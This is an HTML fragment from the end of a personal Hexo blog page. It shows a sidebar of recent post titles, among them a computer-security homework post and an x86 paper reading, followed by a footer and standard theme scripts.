datetime="2023-09-17T04:43:12.000Z" title="Created 2023-09-17 12:43:12">2023-09-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/16/Randomized-Algorithms/" title="Randomized Algorithms"><img src="/img/wall.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Randomized Algorithms"/></a><div class="content"><a class="title" href="/2023/09/16/Randomized-Algorithms/" title="Randomized Algorithms">Randomized Algorithms</a><time datetime="2023-09-15T17:42:31.000Z" title="Created 2023-09-16 01:42:31">2023-09-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/15/%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-Computer-Security-2023-FALL-hw0/" title="程式安全 Computer Security 2023 FALL hw0"><img src="/img/wall.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="程式安全 Computer Security 2023 FALL hw0"/></a><div class="content"><a class="title" href="/2023/09/15/%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-Computer-Security-2023-FALL-hw0/" title="程式安全 Computer Security 2023 FALL hw0">程式安全 Computer Security 2023 FALL hw0</a><time datetime="2023-09-15T10:07:27.000Z" title="Created 2023-09-15 18:07:27">2023-09-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/09/15/Break-x86-ISA-Paper-Reading/" title="Break_x86_ISA_Paper_Reading"><img src="/img/wall.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Break_x86_ISA_Paper_Reading"/></a><div class="content"><a class="title" href="/2023/09/15/Break-x86-ISA-Paper-Reading/" title="Break_x86_ISA_Paper_Reading">Break_x86_ISA_Paper_Reading</a><time datetime="2023-09-14T16:07:17.000Z" title="Created 2023-09-15 00:07:17">2023-09-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/25/A1-Perceptron/" title="A1 Perceptron"><img src="/img/wall.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="A1 Perceptron"/></a><div class="content"><a class="title" href="/2023/03/25/A1-Perceptron/" title="A1 Perceptron">A1 Perceptron</a><time datetime="2023-03-25T03:17:54.000Z" title="Created 2023-03-25 11:17:54">2023-03-25</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Sharkkcode</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>